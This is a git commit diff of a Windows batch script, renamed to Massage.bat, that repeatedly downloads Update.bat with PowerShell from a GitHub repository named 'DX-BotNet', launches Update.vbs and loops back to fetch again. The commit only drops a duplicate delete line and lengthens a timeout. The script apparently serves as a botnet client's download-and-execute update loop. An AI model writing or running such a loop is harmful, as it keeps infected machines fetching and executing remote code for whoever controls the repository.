8a7b61cbfb24a389481033d7ba3d82d6996ea589
AbdulazizDXT <139559982+AbdulazizDXT@users.noreply.github.com>
2023-07-14 21:12:18 +0400

    Update and rename UP.bat to Massage.bat

--- Massage.bat
+++ Massage.bat
@@ -5,11 +5,10 @@ powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDX
 echo #---------------------------------------------------------------------------------------------------------------------------#
 timeout /t 5
 del Update.bat
-del Update.bat
 echo #---------------------------------------------------------------------------------------------------------------------------#
 powershell -command "Invoke-WebRequest https://raw.githubusercontent.com/HyperDXT/DX-BotNet/main/Update.bat -OutFile Update.bat"
 timeout /t 5
 start Update.vbs
-timeout /t 240
+timeout /t 300
 echo #---------------------------------------------------------------------------------------------------------------------------#
 goto start
